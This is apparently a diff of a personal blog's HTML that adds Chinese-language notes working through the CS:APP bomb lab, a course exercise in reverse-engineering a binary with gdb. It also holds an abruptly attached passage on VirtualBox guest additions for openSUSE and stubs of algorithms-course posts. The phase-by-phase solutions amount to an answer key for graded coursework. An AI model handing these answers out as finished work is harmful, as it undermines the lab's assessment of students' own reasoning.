+            <h1 id="Prerequisite"><a href="#Prerequisite" class="headerlink" title="Prerequisite"></a>Prerequisite</h1><ul>
+<li>Mac OSX上没有objdump，此命令属于GNU Binutils，使用brew install binutils安装</li>
+</ul>
+<ul>
+<li>bomb是linux程序，OSX无法运行，需要安装虚拟机</li>
+</ul>
+<ul>
+<li>gdb加参数：程序开始运行后 set args args0 args1…</li>
+</ul>
+<p>int sscanf ( const char <em> s, const char </em> format, …);</p>
+<ul>
+<li><p>s</p>
+<p>C string that the function processes as its source to retrieve the data.</p>
+</li>
+<li><p>format</p>
+<p>C string that contains a format string that follows the same specifications as <em>format</em> in <a href="http://www.cplusplus.com/scanf" target="_blank" rel="external">scanf</a> (see <a href="http://www.cplusplus.com/scanf" target="_blank" rel="external">scanf</a> for details).</p>
+</li>
+<li><p>… <em>(additional arguments)</em></p>
+<p>Depending on the <em>format</em> string, the function may expect a sequence of additional arguments, each containing a pointer to allocated storage where the interpretation of the extracted characters is stored with the appropriate type.There should be at least as many of these arguments as the number of values stored by the <em>format specifiers</em>. Additional arguments are ignored by the function.</p>
+</li>
+</ul>
+<p>On success, the function returns the number of items in the argument list successfully filled. This count can match the expected number of items or be less (even zero) in the case of a matching failure.</p>
+<p>In the case of an input failure before any data could be successfully interpreted, <a href="http://www.cplusplus.com/EOF" target="_blank" rel="external">EOF</a> is returned.</p>
+<h1 id="Lab"><a href="#Lab" class="headerlink" title="Lab"></a>Lab</h1><h2 id="phase1"><a href="#phase1" class="headerlink" title="phase1"></a>phase1</h2><p>程序判断了两个字符串长度，一个是自己的，一个是预设答案。读一下两个的内容即可知道答案。</p>
+<h2 id="phase2"><a href="#phase2" class="headerlink" title="phase2"></a>phase2</h2><p>通过sscanf的第二个参数（存在rsi中）判断答案的格式</p>
+<p>有六个数，存在rsp+0 ，4 ，8 ，12，16，20中</p>
+<p>第一个数为1，后面的数不能为0且为前面的2倍</p>
+<h2 id="phase3"><a href="#phase3" class="headerlink" title="phase3"></a>phase3</h2><p>通过sscanf判断 有两个数a[1]a[2]，存在rsp的低高位</p>
+<p>函数体是一个switch，根据a[1]的值判断a[2]。注意jmpq *0x402470(,%rax, 8)</p>
+<p>要计算0x402470+8*[%rax]，在这个地址内存的才是要跳转的地址，即jmp的indirect jump</p>
+<p>答案共六组</p>
+<h2 id="phase4"><a href="#phase4" class="headerlink" title="phase4"></a>phase4</h2><p>用到了递归，首先判断出答案为两个数字a, b</p>
+<p>调用func4前没有往栈内写数据，判断寄存器情况里猜测传递到参数</p>
+<p>检测a使用了递归</p>
+<p>注意移位命令只有一个参数时，就是向对应方向移一位</p>
+<p>func4是个二分查找…… 判func(a, m, n) a是自己的答案，mn初始值为0，14</p>
+<p>但是递归条件中，当a在当前区间大的那一半时，即使最后找到了返回值也会置1，引爆炸弹</p>
+<p>所以可行解只有7，3，1，0</p>
+<p>当m=n时</p>
+<p>答案是每个区间的中值 1，3，7，10</p>
+<p>检测b直接判断其是否为0</p>
+<h2 id="phase5"><a href="#phase5" class="headerlink" title="phase5"></a>phase5</h2><p>程序使用了stack canary</p>
+<p>答案长度为6</p>
+<p>使用了for循环，依次取出各值放入rdx中</p>
+<p>根据其ASCII码的低位byte在内存中取一个byte存入rsp+10 ~ rsp +15中</p>
+<p>rdi指向这一串字符，esi从0x40245e去一串进行比较，不相等引爆炸弹</p>
+<p>所以通过esi中的值（flyers）得到rdi应该的值，读取0x4024b0及其后的16个byte（因为最后一位最多有16种情况）</p>
+<p>反推正确答案的低位byte</p>
+<p>依次是9 f e 5 6 7，低位是这些的ascii字符都对(e.g. YOnefg, 9?&gt;567 etc.)</p>
+<h2 id="phase6"><a href="#phase6" class="headerlink" title="phase6"></a>phase6</h2><p>和phase2一样，read six number中sscanf判断是6个数，存在phase6的栈底（每个栈块存两个int）</p>
+<p>注意，第六行后必须有回车，否则只能读5个数</p>
+<p>读取后两层循环嵌套，外层循环标记为r12d，rbp和r13指向当前检测字符，每一位减一后都要小于等于5</p>
+<p>由于判断小于用的是jbe 因此参数为unsigned,且&gt;=1</p>
+<p>内存循环标记ebx，指向当前检测字符的下一个，所有数都两两不同，当前字符和其后面的某字符相同时爆炸</p>
+<p>内层循环事实上会超出6个数的范围，访问到栈地址更高的地方，但是那些地方全是0，没有关系</p>
+<p>两层循环的结果表明答案是1 2 3 4 5 6的某个排列&lt;+95&gt;</p>
+<p>然后把所有数a变成b=7-a  &lt;+121&gt;</p>
+<p>遍历这6个数，如果某个数&lt;=1， 则取0x6032d0存到目的地址</p>
+<p>若&gt;1, 则从0x6032d0的node后移b-1个位置取下一node的地址存到目的地址</p>
+<p>这样相当于把6个node(c1~c6)存到rsp+0x20开始的栈上</p>
+<p>（六个目的地址对应为rsp+20 28 30 38 40 48）</p>
+<p>0x6032d0存着6个node，各node起始地址为</p>
+<p>0x6032d0,2e0,2f0,300,310,320</p>
+<p>每个node起始+0存一个数，+4存序数（1-6），+8存下个node开始地址（最后一个node存的0），+e存0</p>
+<p>接着修改对应node的下一地址（修改node顺序）</p>
+<p>把栈上后一个结点的起始地址赋给前一个结点的下一地址</p>
+<p>c1-&gt;c2-&gt;c3&gt;c4-&gt;c5-&gt;c6-&gt;0x0（最后一个结点的下一节点为0）</p>
+<p>接着比较节点存的数，前面的大于等于后面的</p>
+<p>炸弹程序到此结束，解答步骤，根据0x6032d0六个node存的数大小重新排列</p>
+<p>2f0-&gt;300-&gt;310-&gt;320-&gt;2d0-&gt;2e0-&gt;0x0</p>
+<p>这样每个结点相对于初始状态下0x6032d0结点顺序的偏移量就能计算出来 改偏移量</p>
+<p>3 4 5 6 1 2</p>
+<p>这个数即为7-a， 所以答案应为4 3 2 1 6 5</p>
+<p>如果你的 openSUSE 是在 Virtualbox 里装的，它会自动识别到你是装在 Virtualbox 环境的，因此会为您预装好 virtualbox-guest-kmp-desktop virtualbox-guest-tools virtualbox-guest-x11 这三个软件包（相当于从官网下载的那个增强功能扩展）。而如果你的 Virtualbox 是从官网下载 RPM 安装的，这两个的版本一般是不会匹配的。这会导致显示效果不是很好，比如 GNOME shell 非全屏打开应用程序时背景是白色的，然后程序的阴影变成了大黑框，以及鼠标移动到的位置会闪色块等（看上去跟没装显卡驱动的感觉是一样的），这都是因为驱动版本不匹配的原因。</p>
+<p>所以要先打开 YaST 软件管理，把预装的这几个软件包卸载掉。</p>
+<p>然后安装 kernel-desktop-devel gcc make automake 这四个软件包。接着按照上面说的点击「安装增强功能」按钮就可以了。</p>
+<p>在 GNOME 下面会直接问你有个软件，要不要安装，选是，会提示你输入 root 密码然后弹出一个 gnome terminal 窗口，等所有的项目都出现绿色的 done 后，会提示你按 return 这时按回车。然后重启就好。</p>
+<p>KDE 下面可以打开 Dolphin 定位到挂载好的那个文件夹（跟你平时挂载 U 盘是一样的），双击那个 autorun.sh。其它同 GNOME。也可以用命令行：</p>
+<p>cd /var/run/media/&lt;你的用户名&gt;</p>
+<p>./autorun.sh</p>
+
+          
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/02/18/Algorithm-4e-Sort-Collinear-Points/" itemprop="url">
                   Algorithm 4e - Sort & Collinear Points
                 </a>
@@ -312,6 +789,89 @@
 </li>
 </ul>
 
+          
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/02/17/Algorithm-4e-Algorithms-Analysis-Randomized-Queue-and-Deque/" itemprop="url">
+                  Algorithm 4e - Algorithms Analysis & Randomized Queue and Deque
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2016-02-17T23:45:41+08:00" content="2016-02-17">
+              2016-02-17
+            </time>
+          </span>
+
+          
+
+          
+            
+          
+
+          
+
+          
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Algorithms_Analysis"><a href="#Algorithms_Analysis" class="headerlink" title="Algorithms Analysis"></a>Algorithms Analysis</h1><h2 id="Amortized_Analysis"><a href="#Amortized_Analysis" class="headerlink" title="Amortized Analysis"></a>Amortized Analysis</h2><h2 id="Memory_Analysis"><a href="#Memory_Analysis" class="headerlink" title="Memory Analysis"></a>Memory Analysis</h2><h3 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h3><h3 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h3><h3 id="String__26amp_3B_Substrings"><a href="#String__26amp_3B_Substrings" class="headerlink" title="String &amp; Substrings"></a>String &amp; Substrings</h3><h1 id="Linked-list__26amp_3B_Resizing_Array"><a href="#Linked-list__26amp_3B_Resizing_Array" class="headerlink" title="Linked-list &amp; Resizing Array"></a>Linked-list &amp; Resizing Array</h1><h1 id="Iterator"><a href="#Iterator" class="headerlink" title="Iterator"></a>Iterator</h1><h1 id="Programming_Assignment"><a href="#Programming_Assignment" class="headerlink" title="Programming Assignment"></a>Programming Assignment</h1><h2 id="Deque"><a href="#Deque" class="headerlink" title="Deque"></a>Deque</h2><h2 id="Randomized_Queue"><a href="#Randomized_Queue" class="headerlink" title="Randomized Queue"></a>Randomized Queue</h2><h2 id="Subset"><a href="#Subset" class="headerlink" title="Subset"></a>Subset</h2><h2 id="Reservoir_Sampling__28Bonus_29"><a href="#Reservoir_Sampling__28Bonus_29" class="headerlink" title="Reservoir Sampling (Bonus)"></a>Reservoir Sampling (Bonus)</h2>
           
         
       
@@ -655,7 +1215,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">4</span>
+              <span class="site-state-item-count">8</span>
               <span class="site-state-item-name">posts</span>
             </a>
           </div>
@@ -669,7 +1229,7 @@
 
           <div class="site-state-item site-state-tags">
             <a href="/tags">
-              <span class="site-state-item-count">1</span>
+              <span class="site-state-item-count">6</span>
               <span class="site-state-item-name">tags</span>
               </a>
           </div>
